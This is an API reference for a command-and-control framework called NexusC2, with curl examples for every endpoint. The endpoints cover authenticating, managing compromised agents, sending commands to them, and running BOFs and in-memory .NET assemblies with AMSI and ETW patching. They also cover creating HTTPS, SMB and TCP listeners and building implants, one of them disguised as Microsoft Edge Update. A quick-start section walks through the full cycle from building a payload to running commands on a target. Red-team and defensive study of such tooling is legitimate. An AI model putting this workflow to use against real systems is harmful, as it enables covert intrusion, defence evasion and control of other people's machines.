# NexusC2 REST API Reference

Complete developer documentation for every REST API endpoint. All examples use `curl` with the token placement shown explicitly.

**Base URL:** `https://<server>:8443`

> All HTTPS examples below use `-k` to skip certificate verification for local dev. In production, use `--cacert /path/to/ca.crt` instead.

---

## Table of Contents

- [Authentication](#authentication)
- [Agents](#agents)
- [Commands](#commands)
- [BOF Execution](#bof-execution)
- [Assembly Execution](#assembly-execution)
- [Listeners](#listeners)
- [Payloads](#payloads)
- [Profiles](#profiles)
- [Events (SSE)](#events-sse)
- [Health](#health)
- [Error Format](#error-format)

---

## Authentication

All protected endpoints require a JWT access token in the `Authorization` header:

```
Authorization: Bearer <access_token>
```

Tokens are obtained via login (password or certificate), and refreshed before expiry.

---

### POST /api/v1/auth/login

Authenticate with username and password. Supports two modes: shared API password (from `API_PASSWORD` env var) or per-user password.

**Auth required:** No

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `username` | string | **Yes** | Operator username |
| `password` | string | **Yes** | API password or user-specific password |

```bash
curl -sk -X POST https://localhost:8443/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"YOUR_API_PASSWORD"}'
```

**Response (200):**
```json
{
  "access_token": "eyJhbGciOiJIUzI1NiIs...",
  "refresh_token": "a1b2c3d4e5f6...",
  "expires_in": 3600,
  "token_type": "Bearer",
  "username": "admin"
}
```

**Errors:** `400` invalid body, `401` bad credentials, `403` account inactive

---

### POST /api/v1/auth/cert-login

Authenticate using a TLS client certificate. The certificate CN or first SAN must match the requested username. Users are auto-provisioned on first login.

**Auth required:** No (but TLS client certificate required)

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `username` | string | **Yes** | Must match certificate identity |

```bash
curl -sk -X POST https://localhost:8443/api/v1/auth/cert-login \
  --cert client.crt --key client.key \
  -H "Content-Type: application/json" \
  -d '{"username":"operator1"}'
```

**Response (200):** Same as login.

**Errors:** `401` no client certificate, `400` missing username, `403` cert identity mismatch

---

### POST /api/v1/auth/refresh

Exchange a refresh token for a new token pair. The old refresh token is invalidated.

**Auth required:** No

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `refresh_token` | string | **Yes** | Current refresh token |

```bash
curl -sk -X POST https://localhost:8443/api/v1/auth/refresh \
  -H "Content-Type: application/json" \
  -d '{"refresh_token":"a1b2c3d4e5f6..."}'
```

**Response (200):**
```json
{
  "access_token": "eyJhbGciOiJIUzI1NiIs...",
  "refresh_token": "f6e5d4c3b2a1...",
  "expires_in": 3600,
  "token_type": "Bearer",
  "username": "admin"
}
```

**Errors:** `401` invalid/expired refresh token, `403` account inactive

---

### POST /api/v1/auth/logout

Invalidate a refresh token.

**Auth required:** Yes

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `refresh_token` | string | **Yes** | Refresh token to invalidate |

```bash
curl -sk -X POST https://localhost:8443/api/v1/auth/logout \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"refresh_token":"a1b2c3d4e5f6..."}'
```

**Response (200):**
```json
{"message": "logged out successfully"}
```

---

### GET /api/v1/auth/me

Get current authenticated user info.

**Auth required:** Yes

```bash
curl -sk https://localhost:8443/api/v1/auth/me \
  -H "Authorization: Bearer $TOKEN"
```

**Response (200):**
```json
{
  "user_id": "550e8400-e29b-41d4-a716-446655440000",
  "username": "admin"
}
```

---

## Agents

### GET /api/v1/agents

List all agents with pagination.

**Auth required:** Yes

| Query Param | Type | Default | Description |
|-------------|------|---------|-------------|
| `page` | int | `1` | Page number (min 1) |
| `limit` | int | `50` | Results per page (1-100) |
| `include_deleted` | string | `"false"` | Set to `"true"` to include soft-deleted agents |

```bash
curl -sk https://localhost:8443/api/v1/agents?page=1&limit=10 \
  -H "Authorization: Bearer $TOKEN"
```

**Response (200):**
```json
{
  "agents": [
    {
      "id": "550e8400-e29b-41d4-a716-446655440000",
      "new_client_id": "550e8400-e29b-41d4-a716-446655440000",
      "client_id": "abc123",
      "protocol": "https",
      "ext_ip": "203.0.113.50",
      "int_ip": "192.168.1.100",
      "username": "CORP\\jsmith",
      "hostname": "DESKTOP-ABC123",
      "process": "svchost.exe",
      "pid": "1234",
      "arch": "amd64",
      "os": "windows",
      "last_seen": "2026-10-30T12:00:00Z",
      "alias": "target-dc",
      "parent_client_id": null,
      "link_type": null,
      "tags": [
        {"name": "high-value", "color": "#FF0000"}
      ]
    }
  ],
  "pagination": {
    "page": 1,
    "limit": 10,
    "total": 42
  }
}
```

---

### GET /api/v1/agents/:id

Get a single agent by its GUID.

**Auth required:** Yes

| Path Param | Type | Required | Description |
|------------|------|----------|-------------|
| `id` | string | **Yes** | Agent GUID (newclientID) |

```bash
curl -sk https://localhost:8443/api/v1/agents/550e8400-e29b-41d4-a716-446655440000 \
  -H "Authorization: Bearer $TOKEN"
```

**Response (200):** Single agent object (same fields as list item).

**Errors:** `404` agent not found

---

### DELETE /api/v1/agents/:id

Soft-delete an agent (sets `deleted_at` timestamp).

**Auth required:** Yes

| Path Param | Type | Required | Description |
|------------|------|----------|-------------|
| `id` | string | **Yes** | Agent GUID |

```bash
curl -sk -X DELETE https://localhost:8443/api/v1/agents/550e8400-e29b-41d4-a716-446655440000 \
  -H "Authorization: Bearer $TOKEN"
```

**Response (200):**
```json
{"message": "agent deleted successfully"}
```

**Errors:** `404` agent not found

---

### PATCH /api/v1/agents/:id

Update an agent's alias.

**Auth required:** Yes

| Path Param | Type | Required | Description |
|------------|------|----------|-------------|
| `id` | string | **Yes** | Agent GUID |

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `alias` | string | **Yes** | New alias (empty string clears it) |

```bash
curl -sk -X PATCH https://localhost:8443/api/v1/agents/550e8400-e29b-41d4-a716-446655440000 \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"alias":"target-dc"}'
```

**Response (200):**
```json
{"message": "agent updated successfully"}
```

**Errors:** `404` agent not found

---

### POST /api/v1/agents/:id/tags

Add a tag to an agent. If the tag already exists, its color is updated.

**Auth required:** Yes

| Path Param | Type | Required | Description |
|------------|------|----------|-------------|
| `id` | string | **Yes** | Agent GUID |

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `tag_name` | string | **Yes** | Tag name |
| `tag_color` | string | No | Hex color (default: `#4A90E2`) |

```bash
curl -sk -X POST https://localhost:8443/api/v1/agents/550e8400-e29b-41d4-a716-446655440000/tags \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"tag_name":"high-value","tag_color":"#FF0000"}'
```

**Response (200):**
```json
{
  "message": "tag added successfully",
  "tags": [{"name": "high-value", "color": "#FF0000"}]
}
```

---

### DELETE /api/v1/agents/:id/tags/:tag

Remove a tag from an agent.

**Auth required:** Yes

| Path Param | Type | Required | Description |
|------------|------|----------|-------------|
| `id` | string | **Yes** | Agent GUID |
| `tag` | string | **Yes** | Tag name to remove |

```bash
curl -sk -X DELETE \
  https://localhost:8443/api/v1/agents/550e8400-e29b-41d4-a716-446655440000/tags/high-value \
  -H "Authorization: Bearer $TOKEN"
```

**Response (200):**
```json
{
  "message": "tag removed successfully",
  "tags": []
}
```

---

## Commands

### POST /api/v1/agents/:id/commands

Send a command to an agent.

**Auth required:** Yes

| Path Param | Type | Required | Description |
|------------|------|----------|-------------|
| `id` | string | **Yes** | Agent GUID |

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `command` | string | **Yes** | Command string (e.g. `"whoami"`, `"ls -la"`) |
| `data` | string | No | Additional data payload |

```bash
curl -sk -X POST \
  https://localhost:8443/api/v1/agents/550e8400-e29b-41d4-a716-446655440000/commands \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"command":"whoami"}'
```

**Response (200):**
```json
{
  "command_id": "a1b2c3d4-...",
  "db_id": 42,
  "status": "sent",
  "timestamp": "2026-10-30T12:00:00Z"
}
```

**Response (202)** — command queued (agent will pick up on next check-in):
```json
{
  "command_id": "a1b2c3d4-...",
  "db_id": 42,
  "status": "queued",
  "message": "command queued, agent will receive on next check-in"
}
```

**Errors:** `404` agent not found

---

### GET /api/v1/agents/:id/commands

Get command history for an agent.

**Auth required:** Yes

| Path Param | Type | Required | Description |
|------------|------|----------|-------------|
| `id` | string | **Yes** | Agent GUID |

| Query Param | Type | Default | Description |
|-------------|------|---------|-------------|
| `page` | int | `1` | Page number |
| `limit` | int | `50` | Results per page (1-100) |

```bash
curl -sk "https://localhost:8443/api/v1/agents/550e8400-.../commands?page=1&limit=20" \
  -H "Authorization: Bearer $TOKEN"
```

**Response (200):**
```json
{
  "commands": [
    {
      "id": 42,
      "username": "admin",
      "guid": "550e8400-...",
      "command": "whoami",
      "timestamp": "2026-10-30T12:00:00Z",
      "output": "CORP\\jsmith"
    }
  ],
  "pagination": {"page": 1, "limit": 20, "total": 100}
}
```

---

### GET /api/v1/agents/:id/commands/latest

Get the most recent command for an agent, with its output and status.

**Auth required:** Yes

| Path Param | Type | Required | Description |
|------------|------|----------|-------------|
| `id` | string | **Yes** | Agent GUID |

```bash
curl -sk https://localhost:8443/api/v1/agents/550e8400-.../commands/latest \
  -H "Authorization: Bearer $TOKEN"
```

**Response (200):**
```json
{
  "command": {
    "id": 42,
    "username": "admin",
    "guid": "550e8400-...",
    "command": "whoami",
    "timestamp": "2026-10-30T12:00:00Z"
  },
  "outputs": [
    {"output": "CORP\\jsmith", "timestamp": "2026-10-30T12:00:05Z"}
  ],
  "has_output": true,
  "status": "completed"
}
```

**Errors:** `404` no commands found

---

### GET /api/v1/commands/:id

Get a specific command by its database ID, including all output chunks.

**Auth required:** Yes

| Path Param | Type | Required | Description |
|------------|------|----------|-------------|
| `id` | int | **Yes** | Command database ID |

```bash
curl -sk https://localhost:8443/api/v1/commands/42 \
  -H "Authorization: Bearer $TOKEN"
```

**Response (200):**
```json
{
  "command": {
    "id": 42,
    "username": "admin",
    "guid": "550e8400-...",
    "command": "whoami",
    "timestamp": "2026-10-30T12:00:00Z"
  },
  "outputs": [
    {"output": "CORP\\jsmith", "timestamp": "2026-10-30T12:00:05Z"}
  ]
}
```

**Errors:** `400` invalid ID, `404` not found

---

### DELETE /api/v1/agents/:id/commands/queue

Clear pending commands in the queue for an agent.

**Auth required:** Yes

| Path Param | Type | Required | Description |
|------------|------|----------|-------------|
| `id` | string | **Yes** | Agent GUID |

```bash
curl -sk -X DELETE \
  https://localhost:8443/api/v1/agents/550e8400-.../commands/queue \
  -H "Authorization: Bearer $TOKEN"
```

**Response (200):**
```json
{"message": "queue cleared"}
```

---

## BOF Execution

### POST /api/v1/agents/:id/bof

Execute a Beacon Object File (BOF) on a Windows agent. Requires the WebSocket proxy to be connected.

**Auth required:** Yes

| Path Param | Type | Required | Description |
|------------|------|----------|-------------|
| `id` | string | **Yes** | Agent GUID |

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `data` | string | **Yes** | Base64-encoded BOF binary (.o file) |
| `arguments` | string[] | No | Typed argument strings (see format below) |
| `arguments_packed` | string | No | Pre-packed base64 arguments (overrides `arguments`) |
| `bof_name` | string | No | Display name (default: `"api-bof"`) |
| `arch` | string | No | Target arch: `"x64"` or `"x86"` (default: `"x64"`) |
| `async` | bool | No | Run asynchronously (default: `false`) |

**Argument format** (for the `arguments` array):
- `-s:value` — ANSI string
- `-w:value` — Wide (UTF-16) string
- `-i:value` — 32-bit integer
- `-I:value` — 64-bit integer
- `-h:value` — 16-bit short
- `-z:base64data` — Raw binary (base64-encoded)
- `-Z:base64data` — Binary with size prefix (base64-encoded)
- `value` — Plain string (no type prefix)

```bash
curl -sk -X POST \
  https://localhost:8443/api/v1/agents/550e8400-.../bof \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "data": "BASE64_ENCODED_BOF_BINARY",
    "arguments": ["-s:LDAP://DC=corp,DC=local", "-i:1000"],
    "bof_name": "ldap_query",
    "arch": "x64"
  }'
```

**Response (200):**
```json
{
  "message": "command queued successfully",
  "agent_id": "550e8400-...",
  "command_id": "1698681600000000000",
  "command": "bof",
  "username": "admin",
  "timestamp": "2026-10-30T12:00:00Z",
  "status": "queued",
  "db_id": 43
}
```

**Errors:** `400` invalid base64/arguments, `503` WebSocket proxy not configured

---

## Assembly Execution

### POST /api/v1/agents/:id/assembly

Execute a .NET assembly in-memory on a Windows agent. Requires the WebSocket proxy to be connected.

**Auth required:** Yes

| Path Param | Type | Required | Description |
|------------|------|----------|-------------|
| `id` | string | **Yes** | Agent GUID |

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `data` | string | **Yes** | Base64-encoded .NET assembly (.exe/.dll) |
| `arguments` | string[] | No | Command-line arguments passed to the assembly |
| `app_domain` | string | No | CLR AppDomain name (default: `"InlineAssembly"`) |
| `entry_point` | string | No | Entry point method (default: `"Main"`) |
| `disable_amsi` | bool | No | Patch AMSI before execution (default: `false`) |
| `disable_etw` | bool | No | Patch ETW before execution (default: `false`) |
| `revert_etw` | bool | No | Restore ETW after execution (default: `false`) |
| `async` | bool | No | Run asynchronously (default: `false`) |

```bash
curl -sk -X POST \
  https://localhost:8443/api/v1/agents/550e8400-.../assembly \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "data": "BASE64_ENCODED_ASSEMBLY",
    "arguments": ["--users", "--domain", "corp.local"],
    "disable_amsi": true,
    "disable_etw": true
  }'
```

**Response (200):**
```json
{
  "message": "command queued successfully",
  "agent_id": "550e8400-...",
  "command_id": "1698681600000000000",
  "command": "inline-assembly",
  "username": "admin",
  "timestamp": "2026-10-30T12:00:00Z",
  "status": "queued",
  "db_id": 44
}
```

**Errors:** `400` invalid base64, `503` WebSocket proxy not configured

---

## Listeners

### GET /api/v1/listeners

List all configured listeners.

**Auth required:** Yes

```bash
curl -sk https://localhost:8443/api/v1/listeners \
  -H "Authorization: Bearer $TOKEN"
```

**Response (200):**
```json
{
  "listeners": [
    {
      "id": "550e8400-...",
      "name": "https-default",
      "protocol": "HTTPS",
      "port": "443",
      "ip": "0.0.0.0",
      "get_profile": "default-get",
      "post_profile": "default-post",
      "server_response_profile": "default-response",
      "smb_profile": "",
      "tcp_profile": ""
    }
  ]
}
```

---

### GET /api/v1/listeners/:name

Get a single listener by name.

**Auth required:** Yes

| Path Param | Type | Required | Description |
|------------|------|----------|-------------|
| `name` | string | **Yes** | Listener name |

```bash
curl -sk https://localhost:8443/api/v1/listeners/https-default \
  -H "Authorization: Bearer $TOKEN"
```

**Response (200):** Single listener object.

**Errors:** `404` not found

---

### POST /api/v1/listeners

Create a new listener.

**Auth required:** Yes

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `name` | string | **Yes** | Unique listener name |
| `protocol` | string | **Yes** | `HTTP`, `HTTPS`, `SMB`, `TCP`, or `RPC` |
| `port` | int | Conditional | Port 1-65535. Required for HTTP/HTTPS/TCP. Not used for SMB. |
| `ip` | string | No | Bind address (default: `0.0.0.0`). Not used for SMB/TCP. |
| `pipe_name` | string | Conditional | Required for SMB listeners |
| `get_profile` | string | No | GET profile name (default: `"default-get"`) |
| `post_profile` | string | No | POST profile name (default: `"default-post"`) |
| `server_response` | string | No | Server response profile (default: `"default-response"`) |
| `smb_profile` | string | No | SMB link profile name |
| `tcp_profile` | string | No | TCP link profile name |

```bash
# HTTPS listener
curl -sk -X POST https://localhost:8443/api/v1/listeners \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "https-443",
    "protocol": "HTTPS",
    "port": 443,
    "ip": "0.0.0.0",
    "get_profile": "cdn-jquery-get",
    "post_profile": "cdn-analytics-post",
    "server_response": "cdn-analytics-response"
  }'

# SMB listener
curl -sk -X POST https://localhost:8443/api/v1/listeners \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "smb-pivot",
    "protocol": "SMB",
    "pipe_name": "spoolss"
  }'

# TCP listener
curl -sk -X POST https://localhost:8443/api/v1/listeners \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "tcp-4444",
    "protocol": "TCP",
    "port": 4444
  }'
```

**Response (201):**
```json
{
  "message": "listener created successfully",
  "listener": {
    "id": "550e8400-...",
    "name": "https-443",
    "protocol": "HTTPS",
    "port": "443",
    "ip": "0.0.0.0",
    "get_profile": "cdn-jquery-get",
    "post_profile": "cdn-analytics-post",
    "server_response_profile": "cdn-analytics-response",
    "smb_profile": "",
    "tcp_profile": ""
  }
}
```

**Errors:** `400` invalid protocol/port/pipe_name, bad profile name

---

### DELETE /api/v1/listeners/:name

Delete a listener. For HTTP/HTTPS listeners, also stops the port binding.

**Auth required:** Yes

| Path Param | Type | Required | Description |
|------------|------|----------|-------------|
| `name` | string | **Yes** | Listener name |

```bash
curl -sk -X DELETE https://localhost:8443/api/v1/listeners/https-443 \
  -H "Authorization: Bearer $TOKEN"
```

**Response (200):**
```json
{"message": "listener deleted successfully"}
```

**Errors:** `404` not found

---

## Payloads

### POST /api/v1/payloads/build

Build an agent payload binary. This is synchronous — the response body is the compiled binary file. Build takes 20-60 seconds depending on target OS/arch.

**Auth required:** Yes

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `listener` | string | **Yes** | Listener name to callback to |
| `os` | string | **Yes** | `"windows"`, `"linux"`, or `"darwin"` |
| `arch` | string | **Yes** | `"amd64"` or `"arm64"` |
| `language` | string | No | `"go"` (default) |
| `payload_type` | string | No | `"http"`, `"smb"`, or `"tcp"`. Auto-detected from listener protocol if omitted. |
| `pipe_name` | string | No | SMB pipe name. Falls back to listener's pipe_name, then `"spoolss"`. |
| `smb_profile` | string | No | SMB transform profile. Falls back to listener's smb_profile. |
| `tcp_profile` | string | No | TCP transform profile. Falls back to listener's tcp_profile. |
| `tcp_port` | string | No | TCP listen port. Falls back to listener port, then `"4444"`. |
| `profile_variant` | string | No | Profile variant name (overrides listener's GET/POST/Response profiles) |
| `pe_file_description` | string | No | Windows PE VERSIONINFO FileDescription |
| `pe_company_name` | string | No | Windows PE VERSIONINFO CompanyName |
| `pe_product_name` | string | No | Windows PE VERSIONINFO ProductName |
| `pe_file_version` | string | No | Windows PE VERSIONINFO FileVersion |
| `pe_product_version` | string | No | Windows PE VERSIONINFO ProductVersion |
| `safety_checks` | object | No | Execution guard rails (all sub-fields optional) |
| `safety_checks.hostname` | string | No | Agent only runs if hostname matches |
| `safety_checks.username` | string | No | Agent only runs if username matches |
| `safety_checks.domain` | string | No | Agent only runs if domain matches |
| `safety_checks.file_check` | object | No | File existence check |
| `safety_checks.file_check.path` | string | No | File path to check |
| `safety_checks.file_check.must_exist` | bool | No | `true` = file must exist, `false` = must not exist |
| `safety_checks.process` | string | No | Process name that must be running |
| `safety_checks.kill_date` | string | No | Agent self-destructs after this date |
| `safety_checks.working_hours` | object | No | Agent only runs during these hours |
| `safety_checks.working_hours.start` | string | No | Start time (e.g. `"09:00"`) |
| `safety_checks.working_hours.end` | string | No | End time (e.g. `"17:00"`) |

```bash
# Basic Linux payload
curl -sk -X POST https://localhost:8443/api/v1/payloads/build \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"listener":"https-443","os":"linux","arch":"amd64"}' \
  -o payload_linux_amd64

# Windows payload with variant and safety checks
curl -sk -X POST https://localhost:8443/api/v1/payloads/build \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "listener": "https-443",
    "os": "windows",
    "arch": "amd64",
    "profile_variant": "microsoft-graph",
    "pe_company_name": "Microsoft Corporation",
    "pe_product_name": "Microsoft Edge Update",
    "pe_file_description": "Microsoft Edge Update",
    "pe_file_version": "1.3.195.43",
    "pe_product_version": "1.3.195.43",
    "safety_checks": {
      "hostname": "WORKSTATION-01",
      "domain": "CORP",
      "kill_date": "2026-12-31",
      "working_hours": {"start": "08:00", "end": "18:00"}
    }
  }' \
  -o payload_windows_amd64.exe

# SMB link payload
curl -sk -X POST https://localhost:8443/api/v1/payloads/build \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "listener": "smb-pivot",
    "os": "windows",
    "arch": "amd64",
    "pipe_name": "spoolss"
  }' \
  -o payload_smb_amd64.exe

# TCP link payload
curl -sk -X POST https://localhost:8443/api/v1/payloads/build \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "listener": "tcp-4444",
    "os": "linux",
    "arch": "amd64",
    "tcp_port": "4444"
  }' \
  -o payload_tcp_amd64
```

**Response (200):** Binary file download.

**Response Headers:**
- `Content-Type: application/octet-stream`
- `Content-Disposition: attachment; filename="payload_linux_amd64"`
- `X-Build-Duration: 32.50s`

**Errors:** `400` invalid OS/arch/payload_type/variant, `404` listener not found, `500` build failed

---

## Profiles

### GET /api/v1/profiles

List all profiles with their full configuration objects.

**Auth required:** Yes

```bash
curl -sk https://localhost:8443/api/v1/profiles \
  -H "Authorization: Bearer $TOKEN"
```

**Response (200):**
```json
{
  "get_profiles": [{...}],
  "post_profiles": [{...}],
  "server_response_profiles": [{...}],
  "smb_profiles": [{...}],
  "tcp_profiles": [{...}],
  "variants": [{...}]
}
```

---

### GET /api/v1/profiles/names

List only the names of all profiles (useful for populating dropdowns).

**Auth required:** Yes

```bash
curl -sk https://localhost:8443/api/v1/profiles/names \
  -H "Authorization: Bearer $TOKEN"
```

**Response (200):**
```json
{
  "get_profiles": ["default-get", "cdn-jquery-get"],
  "post_profiles": ["default-post", "cdn-analytics-post"],
  "server_response_profiles": ["default-response", "cdn-analytics-response"],
  "smb_profiles": ["default-smb"],
  "tcp_profiles": ["default-tcp"],
  "variants": ["default", "microsoft-graph", "aws-s3", "cdn-analytics"]
}
```

---

### GET /api/v1/profiles/template

Download the TOML profile template file for creating custom profiles.

**Auth required:** Yes

```bash
curl -sk https://localhost:8443/api/v1/profiles/template \
  -H "Authorization: Bearer $TOKEN" \
  -o listener_template.toml
```

**Response (200):** TOML file download with `Content-Type: application/toml`.

---

### POST /api/v1/profiles/upload

Upload new profiles from TOML content. Accepts raw TOML body or multipart file upload. Max 10MB.

**Auth required:** Yes

**Option A — Raw TOML body:**

```bash
curl -sk -X POST https://localhost:8443/api/v1/profiles/upload \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/toml" \
  --data-binary @my_profiles.toml
```

**Option B — Multipart file upload:**

```bash
curl -sk -X POST https://localhost:8443/api/v1/profiles/upload \
  -H "Authorization: Bearer $TOKEN" \
  -F "profile=@my_profiles.toml"
```

**Response (200):**
```json
{
  "status": "success",
  "message": "Successfully added 3 profile(s)",
  "get_profiles_added": ["custom-get"],
  "post_profiles_added": ["custom-post"],
  "server_response_added": ["custom-response"],
  "smb_profiles_added": [],
  "tcp_profiles_added": [],
  "variants_added": [],
  "errors": []
}
```

**Errors:** `400` invalid TOML, validation errors

---

### GET /api/v1/profiles/get

List all GET profiles (full objects).

**Auth required:** Yes

```bash
curl -sk https://localhost:8443/api/v1/profiles/get \
  -H "Authorization: Bearer $TOKEN"
```

**Response (200):**
```json
{"profiles": [{...}]}
```

---

### GET /api/v1/profiles/get/:name

Get a specific GET profile by name.

**Auth required:** Yes

| Path Param | Type | Required | Description |
|------------|------|----------|-------------|
| `name` | string | **Yes** | GET profile name |

```bash
curl -sk https://localhost:8443/api/v1/profiles/get/default-get \
  -H "Authorization: Bearer $TOKEN"
```

**Errors:** `404` not found

---

### DELETE /api/v1/profiles/get/:name

Delete a GET profile.

**Auth required:** Yes

```bash
curl -sk -X DELETE https://localhost:8443/api/v1/profiles/get/custom-get \
  -H "Authorization: Bearer $TOKEN"
```

**Response (200):**
```json
{"status": "success", "message": "GET profile deleted"}
```

**Errors:** `404` not found

---

### GET /api/v1/profiles/post

List all POST profiles.

**Auth required:** Yes

```bash
curl -sk https://localhost:8443/api/v1/profiles/post \
  -H "Authorization: Bearer $TOKEN"
```

---

### GET /api/v1/profiles/post/:name

Get a specific POST profile by name.

**Auth required:** Yes

```bash
curl -sk https://localhost:8443/api/v1/profiles/post/default-post \
  -H "Authorization: Bearer $TOKEN"
```

**Errors:** `404` not found

---

### DELETE /api/v1/profiles/post/:name

Delete a POST profile.

**Auth required:** Yes

```bash
curl -sk -X DELETE https://localhost:8443/api/v1/profiles/post/custom-post \
  -H "Authorization: Bearer $TOKEN"
```

**Errors:** `404` not found

---

### GET /api/v1/profiles/server-response

List all server response profiles.

**Auth required:** Yes

```bash
curl -sk https://localhost:8443/api/v1/profiles/server-response \
  -H "Authorization: Bearer $TOKEN"
```

---

### GET /api/v1/profiles/server-response/:name

Get a specific server response profile by name.

**Auth required:** Yes

```bash
curl -sk https://localhost:8443/api/v1/profiles/server-response/default-response \
  -H "Authorization: Bearer $TOKEN"
```

**Errors:** `404` not found

---

### DELETE /api/v1/profiles/server-response/:name

Delete a server response profile.

**Auth required:** Yes

```bash
curl -sk -X DELETE \
  https://localhost:8443/api/v1/profiles/server-response/custom-response \
  -H "Authorization: Bearer $TOKEN"
```

**Errors:** `404` not found

---

### GET /api/v1/profiles/variants

List all profile variants (full objects).

**Auth required:** Yes

```bash
curl -sk https://localhost:8443/api/v1/profiles/variants \
  -H "Authorization: Bearer $TOKEN"
```

**Response (200):**
```json
{
  "variants": [
    {
      "name": "default",
      "get_profile": "default-get",
      "post_profile": "default-post",
      "server_response_profile": "default-response"
    },
    {
      "name": "cdn-analytics",
      "get_profile": "cdn-jquery-get",
      "post_profile": "cdn-analytics-post",
      "server_response_profile": "cdn-analytics-response"
    }
  ]
}
```

---

### GET /api/v1/profiles/variants/:name

Get a specific profile variant by name.

**Auth required:** Yes

| Path Param | Type | Required | Description |
|------------|------|----------|-------------|
| `name` | string | **Yes** | Variant name |

```bash
curl -sk https://localhost:8443/api/v1/profiles/variants/cdn-analytics \
  -H "Authorization: Bearer $TOKEN"
```

**Errors:** `404` not found

---

## Events (SSE)

### GET /api/v1/events

Subscribe to Server-Sent Events for real-time updates. The connection stays open and streams events as they occur.

**Auth required:** Yes

```bash
curl -sk -N https://localhost:8443/api/v1/events \
  -H "Authorization: Bearer $TOKEN"
```

The `-N` flag disables curl's output buffering so events appear in real time.

**Event stream format:**
```
event: connected
data: {"message":"Connected to event stream","client_id":"user-123-1698681600"}

event: heartbeat
data: {"timestamp":1698681630}

event: listener_update
data: {"event":"created","listener":{...}}

event: listener_update
data: {"event":"deleted","name":"https-443"}
```

**Event types:**
| Event | Description |
|-------|-------------|
| `connected` | Initial connection confirmation with client ID |
| `heartbeat` | Keep-alive every 30 seconds |
| `listener_update` | Listener created or deleted |
| `agent_update` | Agent state change |
| `command_output` | Command result received |

---

## Health

### GET /health

Server health check. No authentication required.

```bash
curl -sk https://localhost:8443/health
```

**Response (200):**
```json
{
  "status": "healthy",
  "goroutines": 42,
  "memory_mb": 128,
  "sse_clients": 2,
  "grpc_connected": true,
  "ws_proxy_enabled": true,
  "ws_proxy_connected": true
}
```

---

## Error Format

All errors return a JSON body with an `error` field:

```json
{"error": "error message"}
```

| Status | Meaning |
|--------|---------|
| `200` | Success |
| `201` | Created |
| `202` | Accepted (queued for async processing) |
| `400` | Bad Request — invalid input or validation failure |
| `401` | Unauthorized — missing/invalid/expired token |
| `403` | Forbidden — account inactive or cert mismatch |
| `404` | Not Found — resource does not exist |
| `429` | Too Many Requests — rate limited (default: 100 req/min) |
| `500` | Internal Server Error |
| `503` | Service Unavailable — required proxy not configured |

Rate limit response includes a `retry_after` field:
```json
{"error": "rate limit exceeded", "retry_after": 60}
```

---

## Quick Start Example

Full workflow from login to payload download:

```bash
# 1. Login and capture token
TOKEN=$(curl -sk -X POST https://localhost:8443/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"YOUR_API_PASSWORD"}' \
  | jq -r '.access_token')

# 2. Create a listener
curl -sk -X POST https://localhost:8443/api/v1/listeners \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"https-443","protocol":"HTTPS","port":443}'

# 3. Build a payload
curl -sk -X POST https://localhost:8443/api/v1/payloads/build \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"listener":"https-443","os":"linux","arch":"amd64"}' \
  -o payload_linux_amd64

# 4. List agents (after payload executes on target)
curl -sk https://localhost:8443/api/v1/agents \
  -H "Authorization: Bearer $TOKEN"

# 5. Send a command
AGENT_ID="<id from step 4>"
curl -sk -X POST "https://localhost:8443/api/v1/agents/$AGENT_ID/commands" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"command":"whoami"}'

# 6. Get command output
curl -sk "https://localhost:8443/api/v1/agents/$AGENT_ID/commands/latest" \
  -H "Authorization: Bearer $TOKEN"
```
